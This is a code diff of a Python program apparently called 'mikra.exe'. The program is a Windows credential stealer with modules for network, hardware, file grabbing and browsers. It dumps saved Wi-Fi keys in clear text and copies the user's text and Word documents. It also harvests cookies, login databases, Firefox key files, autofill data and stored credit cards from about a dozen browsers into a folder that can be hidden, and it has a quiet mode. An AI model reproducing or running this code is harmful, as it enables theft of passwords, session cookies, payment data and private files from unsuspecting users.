@@ -12,12 +12,17 @@ import socket
 import subprocess
 import sys
 import requests
+import netifaces
+import GPUtil
+import psutil
+from win32com.client import GetObject
+from win32api import GetSystemMetrics
 from shutil import copyfile
 
 try:
     if __name__ == "__main__":
-        if "all" in str(sys.argv) or "documents" in str(sys.argv) or "wifi" in str(sys.argv) or "browsers" in str(
-                sys.argv):
+        if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
+                sys.argv) or "browsers" in str(sys.argv):
             windll = ctypes.windll.kernel32
             lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
             encoding = locale.getpreferredencoding()
@@ -26,20 +31,28 @@ try:
             time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
             user = getpass.getuser()
             hostname = socket.gethostname()
-            lip = socket.gethostbyname(socket.gethostname())
-            try:
-                response = requests.get('https://ipinfo.io/json')
-                r = response.json()
-                rip = r['ip']
-            except:
-                rip = "error"
-                pass
+            iip = socket.gethostbyname(socket.gethostname())
+            gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]
             prefix = "{~}"
             timedate = prefix + " " + timedate
             dirname = user + "_" + time
-
             dio = dirname
             os.makedirs(dirname)
+
+            try:
+                response = requests.get('https://ipinfo.io/json')
+                r = response.json()
+                eip = r['ip']
+            except:
+                eip = "Error"
+                pass
+
+            try:
+                output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode(encoding).split('\n')
+                bssidstr = str(output[9]).replace("    BSSID                  :", "")
+            except Exception:
+                bssidstr = "Error"
+                pass
 
             logfile = open(dio + "\\" + user + "-log" + ".json", "w")
             logfile.write("""
@@ -54,15 +67,13 @@ try:
 
 {0}
 (
-	{1}
-	hostname: {2}
-	username: {3}
-	ip: {4}
-	local ip: {5}
-""".format(timedate, typeos, hostname, user, rip, lip))
+	System: {1}
+	Hostname: {2}
+	Username: {3}
+	Language: {4}""".format(timedate, typeos, hostname, user, lang))
 
 
-            def find(pattern, path, pok):
+            def findd(pattern, path, pok):
                 global result
                 result = 0
                 for root, dirs, files in os.walk(path):
@@ -72,7 +83,7 @@ try:
                                 fileg = os.path.join(root, name)
                                 copyfile(fileg, dio + pok + name)
                                 result += 1
-                            except shutil.SameFileError:
+                            except Exception:
                                 pass
 
 
@@ -88,29 +99,10 @@ try:
                                                          
 			""")
                 print(timedate, "\n(")
-                print("	" + typeos)
-                print("	hostname: ", hostname)
-                print(" 	username: ", user)
-                print(" 	ip: ", rip)
-                print(" 	local ip: ", lip)
-
-            if "all" in str(sys.argv) or "documents" in str(sys.argv):
-                os.makedirs(dio + "\\Documents")
-                result = 0
-                find("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
-                res1t = "%.2i" % result
-                find("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
-                res2t = "%.2i" % result
-                find("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
-                res1w = "%.2i" % result
-                find("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
-                res2w = "%.2i" % result
-                resst = int(res1t) + int(res2t)
-                ressw = int(res1w) + int(res2w)
-
-            if "-q" not in str(sys.argv) and "all" in str(sys.argv) or "documents" in str(sys.argv):
-                print(" 	{~} found .txt: ", resst)
-                print(" 	{~} found .docx: ", ressw)
+                print("	System: " + typeos)
+                print("	Hostname: ", hostname)
+                print(" 	Username: ", user)
+                print(" 	Language: ", lang)
 
 
             def networkpass(one, two):
@@ -118,101 +110,204 @@ try:
                     cost = 0
                     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
                     profiles = [i.split(":")[1][1:-1] for i in data if one in i]
-                    logfile.write("	Wi-Fi's [\n")
+                    if "-q" not in str(sys.argv):
+                        print(" 	 Wi-Fi's [")
+                    logfile.write("	 Wi-Fi's [\n")
                     for i in profiles:
                         results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                             encoding).split('\n')
                         results = [b.split(":")[1][1:-1] for b in results if two in b]
                         try:
+                            if "-q" not in str(sys.argv):
+                                print("	   {0}:{1}".format(i, results[0]))
                             logfile.write("		{0}:{1}\n".format(i, results[0]))
                             cost += 1
                         except IndexError:
+                            if "-q" not in str(sys.argv):
+                                print("	   {0}:{1}".format(i, ""))
                             logfile.write("		{0}:{1}\n".format(i, ""))
 
-                    if "-q" not in str(sys.argv):
-                        print(" 	{0} found {1} network/s password/s".format(prefix, cost))
-                except:
-                    if "-q" not in str(sys.argv):
-                        print(" 	{0} found {1} network/s password/s".format(prefix, cost))
+                except Exception:
+                    pass
 
 
-            if "all" in str(sys.argv) or "wifi" in str(sys.argv):
+            if "all" in str(sys.argv) or "network" in str(sys.argv):
+                if "-q" not in str(sys.argv):
+                    print(" 	{~} Network: ")
+                    print(" 	 External ip: ", eip)
+                    print(" 	 Internal ip: ", iip)
+                    print(" 	 Gateway ip: ", gatewayip)
+                    print(" 	 BSSID:", bssidstr)
+                    logfile.write("""
+    {0} Network: 
+     External ip: {1}
+     Internal ip: {2}
+     Gateway ip: {3}
+     BSSID:{4}""".format(prefix, eip, iip, gatewayip, bssidstr))
                 if lang == "en_US":
                     networkpass("All User Profile", "Key Content")
-                    logfile.write("	]\n")
+                    if "-q" not in str(sys.argv):
+                        print("	 ]")
+                    logfile.write("	 ]")
                 elif lang == "ru_RU":
                     networkpass("Все профили пользователей", "Содержимое ключа")
-                    logfile.write("	]\n")
+                    if "-q" not in str(sys.argv):
+                        print("	 ]")
+                    logfile.write("	 ]")
+
+            if "all" in str(sys.argv) or "hardware" in str(sys.argv):
+                def get_cpu_type():
+                    root_winmgmts = GetObject("winmgmts:root\cimv2")
+                    cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
+                    return cpus[0].Name
+
+
+                def get_size(bytes, suffix="B"):
+                    factor = 1024
+                    for unit in ["", "K", "M", "G", "T", "P"]:
+                        if bytes < factor:
+                            return f"{bytes:.2f}{unit}{suffix}"
+                        bytes /= factor
+
+
+                gpus = GPUtil.getGPUs()
+                for gpu in gpus:
+                    gpu_name = gpu.name
+
+                svmem = psutil.virtual_memory()
+                print(" 	{~} Hardware: ")
+                print(" 	 CPU: ", get_cpu_type())
+                print(" 	 GPU: ", gpu_name)
+                print(" 	 RAM: ", get_size(svmem.total))
+                print(" 	 Resolution: ", str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1)))
+                logfile.write("""
+    {0} Hardware:
+     CPU: {1}
+     GPU: {2}
+     RAM: {3}
+     Resolution: {4}""".format(prefix, get_cpu_type(), gpu_name, get_size(svmem.total),
+                               str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1))))
+
+            if "all" in str(sys.argv) or "filegraber" in str(sys.argv):
+                os.makedirs(dio + "\\Documents")
+                findd("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
+                res1t = "%.2i" % result
+                findd("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
+                resst = int(res1t) + int("%.2i" % result)
+                findd("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
+                res1w = "%.2i" % result
+                findd("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
+                ressw = int(res1w) + int("%.2i" % result)
+                if "-q" not in str(sys.argv):
+                    print(" 	{~} File graber: ")
+                    print(" 	 Found .txt: ", resst)
+                    print(" 	 Found .docx: ", ressw)
+                logfile.write("""
+    {0} File graber:
+     Found .txt: {1}
+     Found .docx: {2}""".format(prefix, resst, ressw))
 
 
             def browsers():
+                def find(pattern, path, pok):
+                    global result
+                    result = 0
+                    for root, dirs, files in os.walk(path):
+                        for name in files:
+                            if fnmatch.fnmatch(name, pattern):
+                                try:
+                                    fileg = os.path.join(root, name)
+                                    copyfile(fileg, dio + pok + name)
+                                    result += 1
+                                    return True
+                                except Exception as exx:
+                                    print(exx)
+                                    return False
+
+                def checkp(title):
+                    if "-q" not in str(sys.argv):
+                        print(title)
+
                 if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
                     if os.path.exists(dio + "\\Google Chrome"):
                         shutil.rmtree(dio + "\\Google Chrome")
                     os.makedirs(dio + "\\Google Chrome")
+                    checkp(" 	{~} Google Chrome:")
                     try:
-                        find("Cookies", src, "\\Google Chrome\\")
-                        find("Bookmarks", src, "\\Google Chrome\\")
-                        find("History", src, "\\Google Chrome\\")
-                        find("Login Data", src, "\\Google Chrome\\")
-                        find("Web Data", src, "\\Google Chrome\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Google Chrome")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Google Chrome")
+                        if find("Cookies", src, "\\Google Chrome\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Google Chrome\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Google Chrome\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Google Chrome\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Google Chrome\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
                     if os.path.exists(dio + "\\Opera GX"):
                         shutil.rmtree(dio + "\\Opera GX")
                     os.makedirs(dio + "\\Opera GX")
+                    checkp(" 	{~} Opera GX:")
                     try:
-                        find("Cookies", src, "\\Opera GX\\")
-                        find("Bookmarks", src, "\\Opera GX\\")
-                        find("History", src, "\\Opera GX\\")
-                        find("Login Data", src, "\\Opera GX\\")
-                        find("Web Data", src, "\\Opera GX\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Opera GX")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Opera GX")
+                        if find("Cookies", src, "\\Opera GX\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Opera GX\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Opera GX\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Opera GX\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Opera GX\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
                     if os.path.exists(dio + "\\Opera"):
                         shutil.rmtree(dio + "\\Opera")
                     os.makedirs(dio + "\\Opera")
+                    checkp(" 	{~} Opera:")
                     try:
-                        find("Cookies", src, "\\Opera\\")
-                        find("Bookmarks", src, "\\Opera\\")
-                        find("History", src, "\\Opera\\")
-                        find("Login Data", src, "\\Opera\\")
-                        find("Web Data", src, "\\Opera\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Opera")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Opera")
+                        if find("Cookies", src, "\\Opera\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Opera\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Opera\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Opera\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Opera\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles\\".format(user)
                     if os.path.exists(dio + "\\Firefox"):
                         shutil.rmtree(dio + "\\Firefox")
                     os.makedirs(dio + "\\Firefox")
+                    checkp(" 	{~} Firefox:")
                     try:
-                        find("cookies.sqlite", src, "\\Firefox\\")
-                        find("places.sqlite", src, "\\Firefox\\")
-                        find("key4.db", src, "\\Firefox\\")
-                        find("logins.json", src, "\\Firefox\\")
-                        find("formhistory.sqlite", src, "\\Firefox\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Firefox")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Firefox")
+                        if find("cookies.sqlite", src, "\\Firefox\\"):
+                            checkp(" 	 + Cookies")
+                        if find("places.sqlite", src, "\\Firefox\\"):
+                            checkp(" 	 + History")
+                            checkp(" 	 + Bookmarks")
+                        if find("key4.db", src, "\\Firefox\\"):
+                            checkp(" 	 + Saved Passwords")
+                        if find("logins.json", src, "\\Firefox\\"):
+                            checkp(" 	 + Login Data")
+                        if find("formhistory.sqlite", src, "\\Firefox\\"):
+                            checkp(" 	 + Form Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists(
                         "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
@@ -220,37 +315,46 @@ try:
                     if os.path.exists(dio + "\\Yandex"):
                         shutil.rmtree(dio + "\\Yandex")
                     os.makedirs(dio + "\\Yandex")
+                    checkp(" 	{~} Yandex:")
                     try:
-                        find("Cookies", src, "\\Yandex\\")
-                        find("Bookmarks", src, "\\Yandex\\")
-                        find("History", src, "\\Yandex\\")
-                        find("Login Data", src, "\\Yandex\\")
-                        find("Web Data", src, "\\Yandex\\")
-                        find("Ya Autofill Data", src, "\\Yandex\\")
-                        find("Ya Credit Cards", src, "\\Yandex\\")
-                        find("Ya Passman Data", src, "\\Yandex\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Yandex")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Yandex")
+                        if find("Cookies", src, "\\Yandex\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Yandex\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Yandex\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Yandex\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Yandex\\"):
+                            checkp(" 	 + Web Data")
+                        if find("Ya Autofill Data", src, "\\Yandex\\"):
+                            checkp(" 	 + Autofill Data")
+                        if find("Ya Credit Cards", src, "\\Yandex\\"):
+                            checkp(" 	 + Credit Cards Data")
+                        if find("Ya Passman Data", src, "\\Yandex\\"):
+                            checkp(" 	 + Passman Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)
                     if os.path.exists(dio + "\\Vivaldi"):
                         shutil.rmtree(dio + "\\Vivaldi")
                     os.makedirs(dio + "\\Vivaldi")
+                    checkp(" 	{~} Vivaldi:")
                     try:
-                        find("Cookies", src, "\\Vivaldi\\")
-                        find("Bookmarks", src, "\\Vivaldi\\")
-                        find("History", src, "\\Vivaldi\\")
-                        find("Web Data", src, "\\Vivaldi\\")
-                        find("Login Data", src, "\\Vivaldi\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Vivaldi")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Vivaldi")
+                        if find("Cookies", src, "\\Vivaldi\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Vivaldi\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Vivaldi\\"):
+                            checkp(" 	 + History")
+                        if find("Web Data", src, "\\Vivaldi\\"):
+                            checkp(" 	 + Web Data")
+                        if find("Login Data", src, "\\Vivaldi\\"):
+                            checkp(" 	 + Login Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists(
                         "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
@@ -258,125 +362,146 @@ try:
                     if os.path.exists(dio + "\\Brave"):
                         shutil.rmtree(dio + "\\Brave")
                     os.makedirs(dio + "\\Brave")
+                    checkp(" 	{~} Brave:")
                     try:
-                        find("Cookies", src, "\\Brave\\")
-                        find("Bookmarks", src, "\\Brave\\")
-                        find("History", src, "\\Brave\\")
-                        find("Login Data", src, "\\Brave\\")
-                        find("Web Data", src, "\\Brave\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Brave")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Brave")
+                        if find("Cookies", src, "\\Brave\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Brave\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Brave\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Brave\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Brave\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
                     if os.path.exists(dio + "\\Chrome Canary"):
                         shutil.rmtree(dio + "\\Chrome Canary")
                     os.makedirs(dio + "\\Chrome Canary")
+                    checkp(" 	 {~} Chrome Canary:")
                     try:
-                        find("Cookies", src, "\\Chrome Canary\\")
-                        find("Bookmarks", src, "\\Chrome Canary\\")
-                        find("History", src, "\\Chrome Canary\\")
-                        find("Login Data", src, "\\Chrome Canary\\")
-                        find("Web Data", src, "\\Chrome Canary\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Chrome Canary")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Chrome Canary")
+                        if find("Cookies", src, "\\Chrome Canary\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Chrome Canary\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Chrome Canary\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Chrome Canary\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Chrome Canary\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
                     if os.path.exists(dio + "\\Chromium"):
                         shutil.rmtree(dio + "\\Chromium")
                     os.makedirs(dio + "\\Chromium")
+                    checkp(" 	 {~} Chromium:")
                     try:
-                        find("Cookies", src, "\\Chromium\\")
-                        find("Bookmarks", src, "\\Chromium\\")
-                        find("History", src, "\\Chromium\\")
-                        find("Login Data", src, "\\Chromium\\")
-                        find("Web Data", src, "\\Chromium\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Chromium")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Chromium")
+                        if find("Cookies", src, "\\Chromium\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Chromium\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Chromium\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Chromium\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Chromium\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
                     if os.path.exists(dio + "\\CocCoc"):
                         shutil.rmtree(dio + "\\CocCoc")
                     os.makedirs(dio + "\\CocCoc")
+                    checkp(" 	{~} CocCoc:")
                     try:
-                        find("Cookies", src, "\\CocCoc\\")
-                        find("Bookmarks", src, "\\CocCoc\\")
-                        find("History", src, "\\CocCoc\\")
-                        find("Login Data", src, "\\CocCoc\\")
-                        find("Web Data", src, "\\CocCoc\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} CocCoc")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} CocCoc")
+                        if find("Cookies", src, "\\CocCoc\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\CocCoc\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\CocCoc\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\CocCoc\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\CocCoc\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
                     if os.path.exists(dio + "\\Atom"):
                         shutil.rmtree(dio + "\\Atom")
                     os.makedirs(dio + "\\Atom")
+                    checkp(" 	{~} Atom:")
                     try:
-                        find("Cookies", src, "\\Atom\\")
-                        find("Bookmarks", src, "\\Atom\\")
-                        find("History", src, "\\Atom\\")
-                        find("Login Data", src, "\\Atom\\")
-                        find("Web Data", src, "\\Atom\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Atom")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Atom")
+                        if find("Cookies", src, "\\Atom\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Atom\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Atom\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Atom\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Atom\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
                     if os.path.exists(dio + "\\Orbitum"):
                         shutil.rmtree(dio + "\\Orbitum")
                     os.makedirs(dio + "\\Orbitum")
+                    checkp(" 	 {~} Orbitum")
                     try:
-                        find("Cookies", src, "\\Orbitum\\")
-                        find("Bookmarks", src, "\\Orbitum\\")
-                        find("History", src, "\\Orbitum\\")
-                        find("Login Data", src, "\\Orbitum\\")
-                        find("Web Data", src, "\\Orbitum\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Orbitum")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Orbitum")
+                        if find("Cookies", src, "\\Orbitum\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Orbitum\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Orbitum\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Orbitum\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Orbitum\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)
                     if os.path.exists(dio + "\\Torch"):
                         shutil.rmtree(dio + "\\Torch")
                     os.makedirs(dio + "\\Torch")
+                    checkp(" 	 {~} Torch")
                     try:
-                        find("Cookies", src, "\\Torch\\")
-                        find("Bookmarks", src, "\\Torch\\")
-                        find("History", src, "\\Torch\\")
-                        find("Login Data", src, "\\Torch\\")
-                        find("Web Data", src, "\\Torch\\")
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Torch")
-                    except OSError:
-                        if "-q" not in str(sys.argv):
-                            print(" 	{+} Torch")
+                        if find("Cookies", src, "\\Torch\\"):
+                            checkp(" 	 + Cookies")
+                        if find("Bookmarks", src, "\\Torch\\"):
+                            checkp(" 	 + Bookmarks")
+                        if find("History", src, "\\Torch\\"):
+                            checkp(" 	 + History")
+                        if find("Login Data", src, "\\Torch\\"):
+                            checkp(" 	 + Login Data")
+                        if find("Web Data", src, "\\Torch\\"):
+                            checkp(" 	 + Web Data")
+                    except Exception as ex:
+                        print(ex)
 
 
             if "all" in str(sys.argv) or "browsers" in str(sys.argv):
                 browsers()
 
-            logfile.write(")")
+            logfile.write("\n)")
             logfile.close()
 
             if "-xh" in str(sys.argv):
@@ -395,18 +520,18 @@ try:
 
 
 Usage: mikra.exe [-h] [-xh] [-q]
-		 {all, documents, wifi, browsers}
+		 {all, network, hardware, filegraber, browsers}
 
 Positional arguments:
  all		Launches all modules
- documents	Launches documents module
- wifi		Launches wifi module
+ network	Launches network module
+ hardware	Launches hardware module
+ filegraber	Launches file graber module
  browsers	Launches browsers module
 
 Optional arguments:
  -h		Show help.
  -q		Nothing will be print.
- -xh		Set hidden attribute to mikra dir.
-		""")
+ -xh		Set hidden attribute to mikra dir.""")
 except KeyboardInterrupt:
     sys.exit("\nKeyboardInterrupt")
